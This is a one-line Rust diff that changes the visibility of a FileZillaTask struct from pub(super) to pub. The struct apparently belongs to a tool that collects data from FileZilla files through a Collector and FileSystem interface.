@@ -38,7 +38,7 @@ use utils::base64::base64_decode;
 use windows::Data::Xml::Dom::XmlDocument;
 use windows::core::HSTRING;
 
-pub(super) struct FileZillaTask;
+pub struct FileZillaTask;
 
 impl<C: Collector, F: FileSystem> Task<C, F> for FileZillaTask {
     fn run(&self, parent: &Path, filesystem: &F, collector: &C) {
